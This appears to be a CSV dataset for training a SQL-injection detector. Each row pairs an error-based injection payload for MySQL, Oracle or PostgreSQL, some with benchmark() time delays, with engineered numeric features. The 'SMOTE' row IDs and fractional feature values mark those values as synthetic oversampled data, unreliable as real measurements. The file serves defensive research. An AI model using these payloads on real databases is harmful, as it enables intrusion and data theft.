id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000427,attack,error,"1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",nearest_attack_euclidean,R000132,1.0937231679283648,301.4623497729317,36.61250556396549,3.93983947940957,99.77498887206902,58.09995548827605,112.4249221044831,31.16248330810352,0.33145031375490985,0.1925334220490727,0.37265967393612237,0.1033565902598951,0.0,0.0,0.0,0.0,2.0,1.3874944360345067,0.0,20.774988872069013,0.0,0.0,6.0,4.3874944360345065,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,0.38749443603450656,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.387494436034508
SMOTE_000428,attack,error,"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000041,0.20539777219693514,328.2660425003183,39.684402833354554,3.9735917179128446,107.10641700012732,63.0,122.47522266683643,35.684402833354554,0.32624547404487225,0.19200558409805984,0.3730239091498738,0.10872503270719407,1.0,0.0,2.0,0.0,2.0,2.0,0.0,21.684402833354554,0.0,0.0,6.0,7.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000429,attack,error,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""bizm""  =  ""bizm",nearest_attack_euclidean,R000298,0.28456316815141447,224.75037637402917,30.88639785218447,3.4045911646891875,54.88639785218447,32.0,106.09118281747577,31.772795704368942,0.24424892393542055,0.1424158871379104,0.4719760659544845,0.14135912297218453,0.0,4.0,0.0,0.0,1.0,2.0,0.0,19.772795704368942,0.0,0.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.8863978521844706,0.11360214781552908,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000430,attack,error,"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",nearest_attack_euclidean,R000066,0.3686579448252371,310.45245061049235,37.88420230047692,3.978845552684089,109.49462990620002,55.0,113.18941610333847,32.76840460095385,0.352564113422658,0.17725717440601343,0.36462026800554237,0.10555844416578622,1.0,0.0,0.0,0.0,2.0,1.0,0.0,20.884202300476925,0.0,0.0,6.0,4.0,1.0,-2.7755575615628914e-17,0.0,0.8842023004769244,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.0
SMOTE_000431,attack,error,1  )   where 6116  =  6116 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000284,0.9453550051813809,347.4931614724427,32.75341926377864,3.6138108116423657,94.0,53.0,142.49316147244272,58.0,0.27051736075404165,0.15252574595706603,0.41004192601512196,0.16691496727377036,0.0,0.3767096318893184,2.0,0.0,0.0,3.0,0.0,28.62329036811068,0.0,3.0,0.0,25.0,0.0,0.37670963188931833,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000432,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000233,0.6015530707532537,225.87698857073258,32.22693535701236,3.8904066171189307,75.45387071402472,45.0,81.93849428536629,23.484623571341572,0.3340077640040487,0.19942168862895232,0.36262061450005506,0.10394993286694391,0.7423117856707867,0.0,2.0,0.0,0.0,2.0,0.0,13.742311785670786,0.0,0.0,5.0,4.0,0.7423117856707868,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000433,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000049,0.030550967579476198,192.4952011646647,32.95047988353353,3.6867799219681623,48.14856034939941,40.0,79.29712069879882,25.049520116466468,0.25011679272751525,0.20784669696868643,0.41189873924333875,0.13013777106045954,0.0,1.0,2.0,0.0,1.0,2.0,0.0,14.04952011646647,0.0,0.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000434,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",nearest_attack_euclidean,R000075,0.667359499001343,218.35938260256864,30.26215362250763,3.428343201540883,54.737846377492374,32.0,101.09722898006103,30.524307245015258,0.2507944192262773,0.1465946451999548,0.46284820127652027,0.13976273429724764,4.0,0.0,0.0,0.0,1.0,2.0,0.0,18.524307245015258,0.0,0.0,4.0,3.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.7378463774923718,0.2621536225076282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000435,attack,error,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000171,0.6016646026201317,331.0,28.735993084460155,3.157490548865356,72.79202074661954,42.05602766215939,158.67996542230077,57.47198616892031,0.21991547053359378,0.12705748538416733,0.4793956659284011,0.17363137815383778,0.0,0.0,0.0,0.0,0.0,1.2640069155398468,0.0,33.47198616892031,0.0,0.0,0.7359930844601528,21.264006915539845,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.1102230246251565e-16,0.2640069155398467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.264006915539847
SMOTE_000436,attack,error,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000117,0.5606748711277044,316.23219432189944,38.23219432189945,3.9391796139207744,101.23219432189946,55.0,121.0,39.0,0.3201186137763884,0.17392314531301692,0.3826309196886372,0.12332732122195746,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.0,2.0,0.0,6.0,5.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2321943218994522,0.7678056781005479,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000437,attack,error,"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000134,0.4307097248791226,185.0,36.0,3.887342480535811,60.92017727193983,31.079822728060172,72.0,21.0,0.3292982555239991,0.16799904177329822,0.3891891891891892,0.11351351351351352,0.0,0.9201772719398287,0.15964545612034287,0.0,0.0,1.0,0.0,14.0,0.0,0.0,4.0,1.1596454561203426,0.0,0.9201772719398287,0.07982272806017134,0.9201772719398287,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000438,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000240,0.004732221640406257,313.121496700655,40.0,4.035302938700508,103.05607540030229,63.0,113.05607540030229,34.009345900050384,0.32912285070392555,0.20120294113819104,0.36105982548776544,0.108614382670118,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.009345900050384,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000439,attack,error,"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000060,0.24474231031314225,185.3325882348799,28.24944117615993,3.821316881616816,50.750558823840066,43.33258823487991,66.0,25.24944117615993,0.2738707674083094,0.2337831411226354,0.35612896257680327,0.13621712889225196,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.083147058719977,4.1662941174399535,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.08314705871997692,2.0,0.0,1.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000440,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000031,0.004701805605799506,185.0446825322789,29.991063493544225,3.641754746917614,48.0,35.0,77.0357460258231,25.008936506455775,0.2594000066098576,0.18914583815302122,0.4163041568895856,0.1351499983475356,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.008936506455775,0.0,0.0,5.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000441,attack,error,-8095'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000135,1.8207957635003102,334.35833617777627,35.44652801481469,3.643267509751149,89.33958404444407,48.0,137.78611205925876,59.23264007407345,0.2672025739330753,0.14360409544132435,0.41211613569350436,0.177077194932096,2.3395840444440714,0.0,1.0,0.0,0.0,2.44652801481469,0.0,28.55347198518531,0.8930560296293808,3.0,0.0,23.44652801481469,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.44652801481469034,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.446528014814691
SMOTE_000442,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000062,0.1863435032672215,257.8725049192735,34.09694499103039,3.902169247019393,97.63014244169754,35.0,95.14541748654558,30.09694499103039,0.3785258384201873,0.13575468451114858,0.36900579167614056,0.1167136853925236,0.04847249551519517,0.0,0.0,0.0,2.0,1.0,0.0,19.0,0.0,2.0,5.0,3.0,0.04847249551519528,-2.7755575615628914e-17,0.0,0.04847249551519536,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.0
SMOTE_000443,attack,error,"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",nearest_attack_euclidean,R000197,0.35198788101426437,194.8537535392328,28.0,3.519731125223256,47.85375353923278,35.0,85.0,27.0,0.24558556093754214,0.1796224854910614,0.4362260361925777,0.1385659173788188,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,0.0,5.0,2.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,1.8537535392327764,0.14624646076722342,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000444,attack,error,"1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000060,0.23339229010914614,185.8631463733792,28.287715457793063,3.823099339125938,51.575430915586125,43.0,66.14385772889653,25.14385772889653,0.2773887845888625,0.23141404049786515,0.35592388583352536,0.13527328907974698,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.0,4.143857728896531,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.07192886444826563,2.0,0.0,1.0,0.07192886444826574,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.071928864448266
SMOTE_000445,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000185,1.1698905909892798,349.6423541841326,33.2847083682652,3.5584384530278,88.86116652693921,55.56941673653039,146.5694167365304,58.6423541841326,0.254164271998308,0.1589249420326654,0.41919138304162107,0.16771940292740553,0.0,0.6423541841325984,2.0,0.0,0.0,3.0,0.0,29.6423541841326,0.0,1.0729374476022049,0.6423541841325981,25.0,0.0,0.6423541841325984,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000446,attack,error,"-7543'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000229,0.08109865514640742,217.08938188571267,39.0,3.763749144659673,63.0,37.0,92.27150550857013,24.817876377142532,0.2902263199638218,0.1704503783914509,0.425009167538808,0.11431413410591929,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.817876377142532,0.0,0.0,3.0,3.0,1.0,-2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1102230246251565e-16,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000447,attack,error,"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000290,0.666389314715413,205.26690646747133,32.533812934942645,3.623273118534351,54.266906467471316,40.0,85.0,26.0,0.26436900015600684,0.19486913903152137,0.4140969204419829,0.1266649403704889,1.0,0.0,2.0,0.0,1.0,2.0,0.0,15.0,0.0,0.0,4.0,5.0,1.0,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.2669064674713212,0.7330935325286787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000448,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000033,0.44101830126884883,211.4690178866465,30.153520961450152,3.4584351764155072,54.61408384580061,32.0,95.62253884809665,29.23239519274924,0.25898016136066426,0.15157440473903372,0.451342371161889,0.13810306273841308,0.0,4.0,0.0,0.0,1.0,1.846479038549848,0.0,17.385916154199393,0.0,0.0,4.0,2.8464790385498477,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000449,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000297,2.1526387758982968,344.79719963065185,34.89859981532593,3.6245425817260597,90.73949861494447,48.55070009233704,144.40560073869628,61.10140018467407,0.2630517577230169,0.14082243763512037,0.4188936028771087,0.17723220176475404,0.0,4.0,0.4492999076629648,0.0,0.0,3.0,0.0,29.10140018467407,1.1014001846740704,1.3478997229888945,0.5507000923370349,23.44929990766296,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5507000923370353,0.4492999076629648,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000450,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",nearest_attack_euclidean,R000075,0.2691186538923981,216.16576387148567,30.0,3.455424621858049,55.663055485942635,32.0,98.66847225702868,29.83423612851434,0.25749067613995347,0.14803497943574967,0.4564554400119712,0.13801890441232564,4.0,0.0,0.0,0.0,1.0,1.8342361285143407,0.0,18.0,0.0,0.0,4.0,2.8342361285143407,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000451,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",nearest_attack_euclidean,R000022,2.2737400235157756,190.62633287577103,33.74946684969158,3.6454740920925985,55.49893369938316,32.0,81.00213260123368,22.12526657515421,0.29188420684240113,0.16798218566806172,0.42412470032356797,0.11600890716596915,0.0,0.0,0.8747334248457902,0.0,0.0,1.0,0.0,16.25053315030842,0.0,0.0,4.0,1.8747334248457896,0.0,-2.7755575615628914e-17,0.43736671242289504,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.43736671242289504,1.1102230246251565e-16,0.562633287577105,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000452,attack,error,"1"" where 9172  =  9172 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000240,1.1369381698079453,312.54139989004284,39.08279978008571,4.016311553239765,103.0,63.0,113.0,33.541399890042854,0.3295571783743506,0.20157380813188439,0.3615530209349672,0.10731599255879778,0.0,0.5413998900428535,2.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,7.0,0.0,0.5413998900428535,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
